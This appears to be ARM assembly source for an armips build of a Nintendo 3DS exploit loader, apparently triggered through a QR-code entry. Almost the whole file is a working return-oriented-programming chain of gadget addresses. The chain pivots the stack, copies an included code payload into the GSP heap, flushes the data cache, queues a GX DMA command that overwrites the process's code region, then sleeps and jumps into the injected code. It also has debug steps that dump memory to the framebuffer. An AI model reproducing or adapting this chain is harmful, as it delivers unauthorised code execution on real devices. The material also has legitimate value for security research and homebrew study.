.nds

.include "../../build/constants.s"

.open "sploit_proto.bin","cn_qr_initial_loader.bin",0x0

.arm

CN_GXCOMMAND_ADR equ (CN_GSPHEAP+0x000F0000)
CN_TMPVAR_ADR equ (CN_GSPHEAP+0x000E0000)

;length
.orga 0x60
	.word endROP-ROP+0xA8-0x64
	; .word secondaryROP-ROP+0xA8-0x64

;ROP
.orga 0xA8
ROP:
	;jump to safer place
		
		.word 0x002d2b18 ; pop	{r0, pc}
			.word 0x0FFFE368 ; r0 
		.word 0x00272738 ; ldr r0, [r0] | pop {r4, pc}
			.word 0x00000008 ; r4
		.word 0x001e5ab0 ; add r0, r0, r4 | pop {r4, pc}
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00272738 ; ldr r0, [r0] | pop {r4, pc}
			.word CN_TMPVAR_ADR ; r4 (tmp var adr)
		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}
			.word -(CN_STACKPAYLOADADR-0xA8) ; r4 (offset)
		.word 0x001e5ab0 ; add r0, r0, r4 | pop {r4, pc}
			.word CN_STACKPAYLOADADR+filePayloadOffset-ROP ; r4 (garbage)
		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x001001c8 ; pop {r3} | add sp, sp, r3 | pop {pc}
		filePayloadOffset:
			.word 0xDEADC0DE ; r3 (garbage because gets overwritten by previous gadget)

secondaryROP:

	;copy code to GSP heap
		.word 0x001742ec ; pop {r3, pc}
			.word 0x002d2b18 ; r3 (pop {r0, pc})
		.word 0x00106ee8 ; pop {r4, lr} | bx r3
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0x002d2b18 ; lr (pop	{r0, pc})
		;equivalent to .word 0x002d2b18 ; pop {r0, pc}
			.word CN_TMPVAR_ADR ; r0 (tmp var)
		.word 0x00272738 ; ldr r0, [r0] | pop {r4, pc}
			.word codePatch ; add to r0 -> r1 (src)
		.word 0x001e5ab0 ; add r0, r0, r4 | pop {r4, pc}
			.word CN_CODELOCATIONGSP ; r4 -> r0 (dst)
		.word 0x0016a248 ; mov r1, r0 | mov r0, r4 | pop {r4, r5, r6, lr}
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
		.word 0x0010fc14 ; pop	{r2, r3, r4, pc}
			; .word codePatchEnd-codePatch ; r2 (size) ; beware cache flushing trouble...
			.word 0x00010000 ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x002d2b18 ; pop	{r0, pc}
			.word CN_CODELOCATIONGSP ; r0 (dst)
		.word 0x00229B38 ; memcpy (ends in BX LR)

	;flush data cache
		;equivalent to .word 0x002d2b18 ; pop {r0, pc}
			.word CN_GSPHANDLE_ADR ; r0 (handle ptr)
		.word 0x0022b2bc ; pop	{r1, pc}
			.word 0xFFFF8001 ; r1 (kprocess handle)
		.word 0x0010fc14 ; pop	{r2, r3, r4, pc}
			.word CN_CODELOCATIONGSP  ; r2 (address)
			.word codePatchEnd-codePatch ; r3 (size)
			.word 0xDEADC0DE ; r4 (garbage)
		.word CN_GSPGPU_FlushDataCache_ADR+4 ; GSPGPU_FlushDataCache (ends in LDMFD SP!, {R4-R6,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)

	;create GX command
		.word 0x0027273C ; pop {r4, pc}

			.word CN_GXCOMMAND_ADR+0x0 ; r4
		.word 0x002d2b18 ; pop	{r0, pc}
			.word 0x00000004
		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}

			.word CN_GXCOMMAND_ADR+0x4 ; r4
		.word 0x002d2b18 ; pop	{r0, pc}
			.word CN_CODELOCATIONGSP
		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}

			.word CN_GXCOMMAND_ADR+0x8 ; r4
		.word 0x002d2b18 ; pop	{r0, pc}
			.word CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+CN_INITIALCODE_OFFSET+0x07C00000 ; tmp
		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}

			.word CN_GXCOMMAND_ADR+0xC ; r4
		.word 0x002d2b18 ; pop	{r0, pc}
			.word 0x00010000
			; .word 0x00046500
		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}

			.word CN_GXCOMMAND_ADR+0x10 ; r4
		.word 0x002d2b18 ; pop	{r0, pc}
			; .word 0xFFFFFFFF
			.word 0x00000000
		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}

			.word CN_GXCOMMAND_ADR+0x14 ; r4
		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}
			
			.word CN_GXCOMMAND_ADR+0x18 ; r4
		.word 0x002d2b18 ; pop	{r0, pc}
			.word 0x00000008
		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}

			.word CN_GXCOMMAND_ADR+0x1C ; r4
		.word 0x002d2b18 ; pop	{r0, pc}
			.word 0x00000000
		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}
			.word 0xDEADC0DE ; r4 (garbage)




		; .word 0x0027273C ; pop {r4, pc}
		; 	.word CN_GXCOMMAND_ADR+0x8 ; r4
		; .word 0x002d2b18 ; pop	{r0, pc}
		; 	.word CN_TOPFBADR1
		; .word 0x0020096c ; str r0, [r4] | pop {r4, pc}
		; 	.word 0xDEADC0DE ; r4 (garbage)

	; ;fix GX command address
	; 	.word 0x002d2b18 ; pop	{r0, pc}
	; 		.word 0x1FF80040 ; APPMEMALLOC
	; 	.word 0x00272738 ; ldr r0, [r0] | pop {r4, pc}
	; 		.word CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+CN_INITIALCODE_OFFSET ; r4 (offset to dst from end of APPKICATION mem region)
	; 	.word 0x001e5ab0 ; add r0, r0, r4 | pop {r4, pc}
	; 		.word CN_GXCOMMAND_ADR+0x8 ; r4 (location of dst field in GX command struct)
	; 		; .word CN_GXCOMMAND_ADR+0x4 ; r4 (location of src field in GX command struct)
	; 	.word 0x002d2b18 ; pop	{r0, pc}
	; 		.word CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+CN_INITIALCODE_OFFSET+0x07C00000
	; 	.word 0x0020096c ; str r0, [r4] | pop {r4, pc}
	; 		.word 0xDEADC0DE ; r4 (garbage)

	;send GX command
		.word 0x002d2b18 ; pop	{r0, pc}
			.word CN_GSPSHAREDBUF_ADR ; r0
		.word 0x0022b2bc ; pop	{r1, pc}
			.word CN_GXCOMMAND_ADR ; r1 (cmd addr)
		.word CN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue+4 ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in LDMFD   SP!, {R4-R8,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)

		; .word 0x0027273C ; pop {r4, pc}
		; 	.word CN_GXCOMMAND_ADR+0x8 ; r4
		; .word 0x002d2b18 ; pop	{r0, pc}
		; 	.word CN_TOPFBADR2
		; .word 0x0020096c ; str r0, [r4] | pop {r4, pc}
		; 	.word 0xDEADC0DE ; r4 (garbage)

		; .word 0x002d2b18 ; pop	{r0, pc}
		; 	.word CN_GSPSHAREDBUF_ADR ; r0
		; .word 0x0022b2bc ; pop	{r1, pc}
		; 	.word CN_GXCOMMAND_ADR ; r1 (cmd addr)
		; .word CN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue+4 ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in LDMFD   SP!, {R4-R8,PC})
		; 	.word 0xDEADC0DE ; r4 (garbage)
		; 	.word 0xDEADC0DE ; r5 (garbage)
		; 	.word 0xDEADC0DE ; r6 (garbage)
		; 	.word 0xDEADC0DE ; r7 (garbage)
		; 	.word 0xDEADC0DE ; r8 (garbage)

	;sleep for a second and jump to code
		.word 0x001742ec ; pop {r3, pc}
			.word 0x002d2b18 ; r3 (pop {r0, pc})
		.word 0x00106ee8 ; pop {r4, lr} | bx r3
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0x002d2b18 ; lr (pop {r0, pc})
		;equivalent to .word 0x002d2b18 ; pop {r0, pc}
			.word 0x3B9ACA00 ; r0 = 1 second
			; .word 0xFFFFFFFF ; r0 = forever
		.word 0x0022b2bc ; pop	{r1, pc}
			.word 0x00000000 ; r1
			; .word 0x0FFFFFFF ; r1 = forever
		.word 0x0029D7DC ; svcSleepThread (ends in BX LR)
		;equivalent to .word 0x002d2b18 ; pop {r0, pc}
			.word 0x00000000 ; r0 (time_low)
		.word 0x0022b2bc ; pop	{r1, pc}
			.word 0x00000000 ; r1 (time_high)

; DEBUG !
	;copy garbage to framebuffer
		.word 0x002d2b18 ; pop {r0, pc}
			.word CN_TOPFBADR1    ; r0 (dst)
		.word 0x0022b2bc ; pop	{r1, pc}
			.word CN_CODELOCATIONGSP ; r1 (src)
		.word 0x0010fc14 ; pop	{r2, r3, r4, pc}
			.word 0x46500 ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00229B38 ; memcpy (ends in BX LR)
		;equivalent to .word 0x002d2b18 ; pop {r0, pc}
			.word 0xDEADC0DE ; r0 (garbage)

	;copy garbage to framebuffer
		.word 0x002d2b18 ; pop {r0, pc}
			.word CN_TOPFBADR2    ; r0 (dst)
		.word 0x0022b2bc ; pop	{r1, pc}
			.word CN_CODELOCATIONGSP ; r1 (src)
		.word 0x0010fc14 ; pop	{r2, r3, r4, pc}
			.word 0x46500 ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00229B38 ; memcpy (ends in BX LR)
		;equivalent to .word 0x002d2b18 ; pop {r0, pc}
			.word 0xDEADC0DE ; r0 (garbage)

	;copy garbage to framebuffer
		.word 0x002d2b18 ; pop {r0, pc}
			.word CN_TOPFBADR1+0x46500/2    ; r0 (dst)
		.word 0x0022b2bc ; pop	{r1, pc}
			.word 0x00100000+CN_INITIALCODE_OFFSET ; r1 (src)
		.word 0x0010fc14 ; pop	{r2, r3, r4, pc}
			.word 0x46500/2 ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00229B38 ; memcpy (ends in BX LR)
		;equivalent to .word 0x002d2b18 ; pop {r0, pc}
			.word 0xDEADC0DE ; r0 (garbage)

	;copy garbage to framebuffer
		.word 0x002d2b18 ; pop {r0, pc}
			.word CN_TOPFBADR2+0x46500/2    ; r0 (dst)
		.word 0x0022b2bc ; pop	{r1, pc}
			.word 0x00100000+CN_INITIALCODE_OFFSET ; r1 (src)
		.word 0x0010fc14 ; pop	{r2, r3, r4, pc}
			.word 0x46500/2 ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00229B38 ; memcpy (ends in BX LR)
		;equivalent to .word 0x002d2b18 ; pop {r0, pc}
			.word 0xDEADC0DE ; r0 (garbage)

		.word 0x00100000+CN_INITIALCODE_OFFSET ;jump to code

		.word 0xBEEF0000
endROP:

.align 4
codePatch:
	.incbin "cn_initial/cn_initial.bin"
	.word 0xDEADDEAD
	.word 0xDEADDEAD
	.word 0xDEADDEAD
	.word 0xDEADDEAD
codePatchEnd:

.Close
